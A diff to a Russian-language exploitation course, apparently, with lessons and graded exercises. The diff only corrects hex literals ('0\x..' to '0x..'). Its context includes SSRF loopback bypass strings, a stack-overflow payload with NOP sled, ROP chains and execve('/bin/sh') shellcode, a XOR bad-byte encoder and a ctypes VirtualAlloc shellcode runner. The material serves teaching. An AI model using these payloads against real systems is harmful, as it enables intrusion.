@@ -189,7 +189,7 @@ def pkcs7_unpad(data: bytes) -> bytes:
 \`P'_i = I_i XOR C'\`
 
 Подбирая последний байт \`C'\` так, чтобы \`P'_i\` заканчивался на \`\\\x01\` (валидный padding), мы узнаём \`I_i[15]\`:
-\`I_i[15] = C'[15] XOR 0\x01\`
+\`I_i[15] = C'[15] XOR 0x01\`
 
 ## Пошаговый алгоритм
 
@@ -264,9 +264,9 @@ def full_padding_oracle_attack(oracle, ciphertext: bytes, block_size: int = 16) 
       difficulty: 'hard' as const,
       starterCode: 'def pkcs7_pad(data_hex: str, block_size: int) -> str:\n    pass\n\ndef pkcs7_unpad(data_hex: str) -> str:\n    pass\n\ndef pkcs7_validate(data_hex: str) -> str:\n    pass\n\ncmd = input().strip()\ndata = input().strip()\nif cmd == "pad":\n    bs = int(input().strip())\n    print(pkcs7_pad(data, bs))\nelif cmd == "unpad":\n    print(pkcs7_unpad(data))\nelse:\n    print(pkcs7_validate(data))\n',
       testCases: [
-        { input: 'pad\n48656c6c6f\n16', expectedOutput: '48656c6c6f0b0b0b0b0b0b0b0b0b0b0b', description: '"Hello" (5 байт) + 11 байт padding 0\x0b' },
+        { input: 'pad\n48656c6c6f\n16', expectedOutput: '48656c6c6f0b0b0b0b0b0b0b0b0b0b0b', description: '"Hello" (5 байт) + 11 байт padding 0x0b' },
         { input: 'unpad\n48656c6c6f0b0b0b0b0b0b0b0b0b0b0b', expectedOutput: '48656c6c6f', description: 'Убираем padding, получаем "Hello"' },
-        { input: 'validate\n41424304040404', expectedOutput: 'VALID', description: '"ABC" + 4 байта 0\x04 — валидный padding для блока 7' },
+        { input: 'validate\n41424304040404', expectedOutput: 'VALID', description: '"ABC" + 4 байта 0x04 — валидный padding для блока 7' },
         { input: 'validate\n4142430405', expectedOutput: 'INVALID', description: 'Последний байт 05, но предпоследний не 05 — невалидно' },
       ],
       points: 18,
@@ -949,7 +949,7 @@ def generate_ssrf_bypasses(target_ip: str = "127.0.0.1") -> list:
         "http://0.0.0.0",
         "http://localhost",
         "http://[::1]",         # IPv6 loopback
-        "http://0\x7f000001",    # hex IP
+        "http://0x7f000001",    # hex IP
         "http://2130706433",    # decimal IP
         "http://017700000001",  # octal IP
         "http://127.1",         # сокращённый IP
@@ -1594,10 +1594,10 @@ def simulate_stack_overflow(buffer_size: int, input_data: bytes,
         "eip_overwritten": len(input_data) > buffer_size + 4,
     }
 
-# Пример: перезаписываем return address на 0\xdeadbeef
-payload = b"A" * 64 + b"BBBB" + struct.pack("<I", 0\xdeadbeef)
-result = simulate_stack_overflow(64, payload, 0\x12345678, 0\x08041234)
-print(f"EIP перезаписан: {hex(result['return_addr'])}")  # 0\xdeadbeef
+# Пример: перезаписываем return address на 0xdeadbeef
+payload = b"A" * 64 + b"BBBB" + struct.pack("<I", 0xdeadbeef)
+result = simulate_stack_overflow(64, payload, 0x12345678, 0x08041234)
+print(f"EIP перезаписан: {hex(result['return_addr'])}")  # 0xdeadbeef
 \`\`\`
 
 ## NOP Sled + Shellcode
@@ -1627,7 +1627,7 @@ shellcode_binsh = (
 exploit = create_exploit_payload(
     buffer_size=64, nop_size=30,
     shellcode=shellcode_binsh,
-    ret_addr=0\xbffff600  # приблизительный адрес NOP sled
+    ret_addr=0xbffff600  # приблизительный адрес NOP sled
 )
 print(f"Payload size: {len(exploit)} bytes")
 \`\`\`
@@ -1655,8 +1655,8 @@ def find_offset(pattern: bytes, value: int) -> int:
 # Использование:
 # 1. Отправляем паттерн программе
 pattern = generate_cyclic_pattern(200)
-# 2. Смотрим значение EIP при крэше (например 0\x63413563)
-offset = find_offset(pattern, 0\x63413563)
+# 2. Смотрим значение EIP при крэше (например 0x63413563)
+offset = find_offset(pattern, 0x63413563)
 print(f"Offset to EIP: {offset}")
 \`\`\`
 
@@ -1677,13 +1677,13 @@ print(f"Offset to EIP: {offset}")
     duration: 60,
     assignment: {
       title: 'Моделирование buffer overflow',
-      description: 'Реализуйте симулятор стека. На вход: buffer_size (размер буфера), input_hex (входные данные в hex). Стек: buffer[buffer_size] + saved_ebp(4 байта, изначально 0\x41414141) + return_addr(4 байта, изначально 0\x08040000). Выведите: OVERFLOW:YES/NO, EBP:0xXXXXXXXX (значение saved_ebp после записи), RET:0xXXXXXXXX (значение return_addr после записи). Значения — little-endian.',
+      description: 'Реализуйте симулятор стека. На вход: buffer_size (размер буфера), input_hex (входные данные в hex). Стек: buffer[buffer_size] + saved_ebp(4 байта, изначально 0x41414141) + return_addr(4 байта, изначально 0x08040000). Выведите: OVERFLOW:YES/NO, EBP:0xXXXXXXXX (значение saved_ebp после записи), RET:0xXXXXXXXX (значение return_addr после записи). Значения — little-endian.',
       difficulty: 'hard' as const,
       starterCode: 'import struct\n\ndef simulate_overflow(buffer_size: int, input_hex: str) -> dict:\n    pass\n\nbuf_size = int(input())\ninput_hex = input().strip()\nresult = simulate_overflow(buf_size, input_hex)\nprint(f"OVERFLOW:{result[\'overflow\']}")\nprint(f"EBP:0x{result[\'ebp\']:08x}")\nprint(f"RET:0x{result[\'ret\']:08x}")\n',
       testCases: [
-        { input: '8\n4141414141414141424242424344454647', expectedOutput: 'OVERFLOW:YES\nEBP:0\x42424242\nRET:0\x47464544', description: '8 байт буфер + AAAA перезаписывают EBP=BBBB, RET=CDEF (little-endian)' },
-        { input: '16\n41414141', expectedOutput: 'OVERFLOW:NO\nEBP:0\x41414141\nRET:0\x08040000', description: '4 байта в 16-байтный буфер — нет переполнения, EBP и RET без изменений' },
-        { input: '4\n90909090909090909090909090efbeadde', expectedOutput: 'OVERFLOW:YES\nEBP:0\x90909090\nRET:0\xdeadbeef', description: '4 NOP + 4 NOP(EBP) + 0\xdeadbeef(RET) little-endian' },
+        { input: '8\n4141414141414141424242424344454647', expectedOutput: 'OVERFLOW:YES\nEBP:0x42424242\nRET:0x47464544', description: '8 байт буфер + AAAA перезаписывают EBP=BBBB, RET=CDEF (little-endian)' },
+        { input: '16\n41414141', expectedOutput: 'OVERFLOW:NO\nEBP:0x41414141\nRET:0x08040000', description: '4 байта в 16-байтный буфер — нет переполнения, EBP и RET без изменений' },
+        { input: '4\n90909090909090909090909090efbeadde', expectedOutput: 'OVERFLOW:YES\nEBP:0x90909090\nRET:0xdeadbeef', description: '4 NOP + 4 NOP(EBP) + 0xdeadbeef(RET) little-endian' },
       ],
       points: 20,
     },
@@ -1783,7 +1783,7 @@ def calculate_format_write(target_addr: int, value: int) -> str:
     import struct
     writes = []
     for i in range(4):
-        byte_val = (value >> (i * 8)) & 0\xFF
+        byte_val = (value >> (i * 8)) & 0xFF
         addr = target_addr + i
         writes.append((addr, byte_val))
 
@@ -1823,7 +1823,7 @@ def got_overwrite_plan(got_entry: int, target_func: int) -> dict:
 
 # Пример: перезаписываем printf@GOT на system
 # Теперь printf("/bin/sh") вызовет system("/bin/sh")
-plan = got_overwrite_plan(0\x0804a010, 0\x08041060)
+plan = got_overwrite_plan(0x0804a010, 0x08041060)
 \`\`\`
 
 ## Защита
@@ -1850,7 +1850,7 @@ plan = got_overwrite_plan(0\x0804a010, 0\x08041060)
       starterCode: 'def format_string_sim(fmt: str, stack: list) -> str:\n    pass\n\nfmt = input()\nstack = list(map(int, input().split()))\nprint(format_string_sim(fmt, stack))\n',
       testCases: [
         { input: '%x.%x.%x\n255 4096 31337', expectedOutput: 'ff.1000.7a69', description: '%x выводит hex без ведущих нулей' },
-        { input: 'addr=%3$p val=%1$d\n100 200 48879', expectedOutput: 'addr=0\xbeef val=100', description: 'Прямой доступ: %3$p=третий(48879=0\xbeef), %1$d=первый(100)' },
+        { input: 'addr=%3$p val=%1$d\n100 200 48879', expectedOutput: 'addr=0xbeef val=100', description: 'Прямой доступ: %3$p=третий(48879=0xbeef), %1$d=первый(100)' },
         { input: 'A%xB%xC\n10 255', expectedOutput: 'AaB ffC', description: 'Обычные символы между спецификаторами сохраняются' },
         { input: '%d+%d=%d\n3 5 8', expectedOutput: '3+5=8', description: 'Десятичный вывод' },
       ],
@@ -1877,15 +1877,15 @@ plan = got_overwrite_plan(0\x0804a010, 0\x08041060)
 
 \`\`\`asm
 ; Гаджет 1: pop eax; ret
-0\x08041234: pop eax
-0\x08041235: ret
+0x08041234: pop eax
+0x08041235: ret
 
 ; Гаджет 2: pop ebx; ret
-0\x08041238: pop ebx
-0\x08041239: ret
+0x08041238: pop ebx
+0x08041239: ret
 
-; Гаджет 3: int 0\x80 (системный вызов)
-0\x0804123c: int 0\x80
+; Гаджет 3: int 0x80 (системный вызов)
+0x0804123c: int 0x80
 \`\`\`
 
 ## Принцип работы
@@ -1894,15 +1894,15 @@ plan = got_overwrite_plan(0\x0804a010, 0\x08041060)
 
 \`\`\`
 ┌──────────────────┐
-│ addr(gadget_1)    │ → pop eax; ret  → eax = 0\x0b (execve)
+│ addr(gadget_1)    │ → pop eax; ret  → eax = 0x0b (execve)
 ├──────────────────┤
-│ 0\x0000000b        │ (значение для eax)
+│ 0x0000000b        │ (значение для eax)
 ├──────────────────┤
 │ addr(gadget_2)    │ → pop ebx; ret  → ebx = addr("/bin/sh")
 ├──────────────────┤
 │ addr("/bin/sh")   │ (значение для ebx)
 ├──────────────────┤
-│ addr(gadget_3)    │ → int 0\x80       → системный вызов execve
+│ addr(gadget_3)    │ → int 0x80       → системный вызов execve
 └──────────────────┘
 \`\`\`
 
@@ -1964,11 +1964,11 @@ class ROPChain:
 
 # Пример: execve("/bin/sh", NULL, NULL) на x86 Linux
 rop = ROPChain("x86")
-rop.add_gadget(0\x08041234, 0\x0b)        # pop eax; ret → eax = 11 (execve)
-rop.add_gadget(0\x08041238, 0\x0804b000)  # pop ebx; ret → ebx = "/bin/sh"
-rop.add_gadget(0\x0804123c, 0\x00000000)  # pop ecx; ret → ecx = NULL
-rop.add_gadget(0\x08041240, 0\x00000000)  # pop edx; ret → edx = NULL
-rop.add_value(0\x08041250)               # int 0\x80
+rop.add_gadget(0x08041234, 0x0b)        # pop eax; ret → eax = 11 (execve)
+rop.add_gadget(0x08041238, 0x0804b000)  # pop ebx; ret → ebx = "/bin/sh"
+rop.add_gadget(0x0804123c, 0x00000000)  # pop ecx; ret → ecx = NULL
+rop.add_gadget(0x08041240, 0x00000000)  # pop edx; ret → edx = NULL
+rop.add_value(0x08041250)               # int 0x80
 print(rop.dump())
 \`\`\`
 
@@ -1978,10 +1978,10 @@ print(rop.dump())
 def find_gadgets_in_binary(binary_data: bytes, max_gadget_len: int = 5) -> list:
     """
     Ищет ROP-гаджеты в бинарных данных.
-    Ищем 0\xc3 (ret) и дизассемблируем назад.
+    Ищем 0xc3 (ret) и дизассемблируем назад.
     """
     gadgets = []
-    ret_byte = 0\xc3
+    ret_byte = 0xc3
     for i in range(len(binary_data)):
         if binary_data[i] == ret_byte:
             # Пробуем разные длины гаджета
@@ -2041,7 +2041,7 @@ def ret2libc_payload(system_addr, exit_addr, binsh_addr, offset):
       starterCode: 'import struct\n\ndef build_rop(arch: str, commands: list) -> str:\n    pass\n\narch = input().strip()\ncmds = []\nwhile True:\n    try:\n        line = input().strip()\n        if line:\n            cmds.append(line)\n    except EOFError:\n        break\nprint(build_rop(arch, cmds))\n',
       testCases: [
         { input: 'x86\ngadget 08041234 0b\ngadget 08041238 0804b000', expectedOutput: '341204080b000000381204080000b00408', description: 'x86: два гаджета с аргументами, little-endian 4 байта' },
-        { input: 'x86\npadding 4\nvalue deadbeef', expectedOutput: '41414141efbeadde', description: 'padding AAAA + value 0\xdeadbeef' },
+        { input: 'x86\npadding 4\nvalue deadbeef', expectedOutput: '41414141efbeadde', description: 'padding AAAA + value 0xdeadbeef' },
         { input: 'x64\ngadget 00400123 0b', expectedOutput: '230140000000000000b000000000000000', description: 'x64: гаджет + аргумент, 8 байт little-endian' },
       ],
       points: 20,
@@ -2066,7 +2066,7 @@ def ret2libc_payload(system_addr, exit_addr, binsh_addr, offset):
 Для вызова ядра Linux:
 1. Номер syscall → \`eax\`
 2. Аргументы → \`ebx, ecx, edx, esi, edi, ebp\`
-3. \`int 0\x80\` — вызов ядра
+3. \`int 0x80\` — вызов ядра
 
 | Syscall | eax | Описание |
 |---------|-----|----------|
@@ -2081,14 +2081,14 @@ def ret2libc_payload(system_addr, exit_addr, binsh_addr, offset):
 ; execve("/bin/sh", NULL, NULL)
 xor eax, eax       ; eax = 0
 push eax            ; NULL terminator
-push 0\x68732f2f     ; "//sh"
-push 0\x6e69622f     ; "/bin"
+push 0x68732f2f     ; "//sh"
+push 0x6e69622f     ; "/bin"
 mov ebx, esp        ; ebx = pointer to "/bin//sh"
 push eax            ; NULL
 mov ecx, esp        ; ecx = NULL
 xor edx, edx        ; edx = NULL
-mov al, 0\x0b        ; syscall execve = 11
-int 0\x80            ; вызов ядра
+mov al, 0x0b        ; syscall execve = 11
+int 0x80            ; вызов ядра
 \`\`\`
 
 ## Работа с shellcode на Python
@@ -2103,13 +2103,13 @@ def assemble_to_hex(asm_description: list) -> bytes:
     opcodes = {
         "xor eax, eax": b"\\x31\\xc0",
         "push eax": b"\\x50",
-        "push 0\x68732f2f": b"\\x68\\x2f\\x2f\\x73\\x68",
-        "push 0\x6e69622f": b"\\x68\\x2f\\x62\\x69\\x6e",
+        "push 0x68732f2f": b"\\x68\\x2f\\x2f\\x73\\x68",
+        "push 0x6e69622f": b"\\x68\\x2f\\x62\\x69\\x6e",
         "mov ebx, esp": b"\\x89\\xe3",
         "mov ecx, esp": b"\\x89\\xe1",
         "xor edx, edx": b"\\x31\\xd2",
-        "mov al, 0\x0b": b"\\xb0\\x0b",
-        "int 0\x80": b"\\xcd\\x80",
+        "mov al, 0x0b": b"\\xb0\\x0b",
+        "int 0x80": b"\\xcd\\x80",
     }
     shellcode = b""
     for instr in asm_description:
@@ -2120,9 +2120,9 @@ def assemble_to_hex(asm_description: list) -> bytes:
 # execve("/bin/sh") shellcode
 shellcode = assemble_to_hex([
     "xor eax, eax", "push eax",
-    "push 0\x68732f2f", "push 0\x6e69622f",
+    "push 0x68732f2f", "push 0x6e69622f",
     "mov ebx, esp", "push eax", "mov ecx, esp",
-    "xor edx, edx", "mov al, 0\x0b", "int 0\x80"
+    "xor edx, edx", "mov al, 0x0b", "int 0x80"
 ])
 print(f"Shellcode ({len(shellcode)} bytes): {shellcode.hex()}")
 \`\`\`
@@ -2142,7 +2142,7 @@ def check_null_free(shellcode: bytes) -> dict:
         "size": len(shellcode),
     }
 
-def remove_nulls_xor(shellcode: bytes, key: int = 0\x41) -> tuple:
+def remove_nulls_xor(shellcode: bytes, key: int = 0x41) -> tuple:
     """XOR-кодирует shellcode для удаления null-байтов."""
     if key == 0:
         raise ValueError("Key cannot be 0!")
@@ -2164,7 +2164,7 @@ def xor_encoder(shellcode: bytes, bad_bytes: list = None) -> tuple:
     Возвращает (decoder_stub + encoded_shellcode, key).
     """
     if bad_bytes is None:
-        bad_bytes = [0\x00, 0\x0a, 0\x0d]
+        bad_bytes = [0x00, 0x0a, 0x0d]
 
     # Ищем подходящий ключ
     for key in range(1, 256):
@@ -2221,7 +2221,7 @@ def format_shellcode_python(shellcode: bytes) -> str:
 import ctypes
 shellcode = bytes.fromhex("{hex_str}")
 ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
-ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0\x3000, 0\x40)
+ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
 ctypes.memmove(ptr, shellcode, len(shellcode))
 ctypes.cast(ptr, ctypes.CFUNCTYPE(None))()
 '''
@@ -2242,7 +2242,7 @@ ctypes.cast(ptr, ctypes.CFUNCTYPE(None))()
       testCases: [
         { input: '31c050682f2f7368\n00 0a 0d', expectedOutput: 'KEY:1\n30c151692e2e7269', description: 'Ключ 1: каждый байт XOR 1, нет bad bytes в результате' },
         { input: '00000000\n00', expectedOutput: 'KEY:1\n01010101', description: 'Нули XOR 1 = единицы, ключ 1 не в bad bytes' },
-        { input: 'ff\n00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f', expectedOutput: 'KEY:16\nef', description: '0\xff XOR 0\x10 = 0\xef, ключ 16 (0\x10) не в bad bytes' },
+        { input: 'ff\n00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f', expectedOutput: 'KEY:16\nef', description: '0xff XOR 0x10 = 0xef, ключ 16 (0x10) не в bad bytes' },
       ],
       points: 18,
     },
@@ -2293,14 +2293,14 @@ def parse_ethernet_header(data: bytes) -> dict:
         "dst_mac": dst_mac,
         "src_mac": src_mac,
         "type": hex(eth_type),
-        "type_name": {0\x0800: "IPv4", 0\x0806: "ARP", 0\x86dd: "IPv6"}.get(eth_type, "Unknown"),
+        "type_name": {0x0800: "IPv4", 0x0806: "ARP", 0x86dd: "IPv6"}.get(eth_type, "Unknown"),
         "payload": data[14:],
     }
 
 def parse_ipv4_header(data: bytes) -> dict:
     """Парсит IPv4 заголовок."""
-    version = (data[0] >> 4) & 0\xF
-    ihl = (data[0] & 0\xF) * 4  # длина заголовка в байтах
+    version = (data[0] >> 4) & 0xF
+    ihl = (data[0] & 0xF) * 4  # длина заголовка в байтах
     total_len = struct.unpack('!H', data[2:4])[0]
     ttl = data[8]
     protocol = data[9]
@@ -2323,14 +2323,14 @@ def parse_tcp_header(data: bytes) -> dict:
     dst_port = struct.unpack('!H', data[2:4])[0]
     seq = struct.unpack('!I', data[4:8])[0]
     ack = struct.unpack('!I', data[8:12])[0]
-    offset = ((data[12] >> 4) & 0\xF) * 4
+    offset = ((data[12] >> 4) & 0xF) * 4
     flags = data[13]
     flag_names = []
-    if flags & 0\x02: flag_names.append("SYN")
-    if flags & 0\x10: flag_names.append("ACK")
-    if flags & 0\x01: flag_names.append("FIN")
-    if flags & 0\x04: flag_names.append("RST")
-    if flags & 0\x08: flag_names.append("PSH")
+    if flags & 0x02: flag_names.append("SYN")
+    if flags & 0x10: flag_names.append("ACK")
+    if flags & 0x01: flag_names.append("FIN")
+    if flags & 0x04: flag_names.append("RST")
+    if flags & 0x08: flag_names.append("PSH")
     return {
         "src_port": src_port,
         "dst_port": dst_port,
@@ -2636,7 +2636,7 @@ def osint_report(domain: str) -> dict:
 
 ### FAT32
 - Простая структура: загрузочный сектор + FAT-таблица + данные
-- Удалённые файлы: первый символ имени заменяется на 0\xE5
+- Удалённые файлы: первый символ имени заменяется на 0xE5
 - Данные остаются до перезаписи
 
 ### NTFS
@@ -2672,17 +2672,17 @@ def parse_mbr(data: bytes) -> dict:
         if part_type != 0:
             partitions.append({
                 "number": i + 1,
-                "status": "Active" if status == 0\x80 else "Inactive",
+                "status": "Active" if status == 0x80 else "Inactive",
                 "type": {
-                    0\x07: "NTFS", 0\x0b: "FAT32", 0\x0c: "FAT32 LBA",
-                    0\x83: "Linux ext", 0\x82: "Linux swap",
-                    0\x05: "Extended", 0\x0f: "Extended LBA",
+                    0x07: "NTFS", 0x0b: "FAT32", 0x0c: "FAT32 LBA",
+                    0x83: "Linux ext", 0x82: "Linux swap",
+                    0x05: "Extended", 0x0f: "Extended LBA",
                 }.get(part_type, f"Unknown (0x{part_type:02x})"),
                 "lba_start": lba_start,
                 "size_mb": size_sectors * 512 / (1024 * 1024),
             })
     return {
-        "valid_mbr": signature == 0\xAA55,
+        "valid_mbr": signature == 0xAA55,
         "partitions": partitions,
     }
 \`\`\`
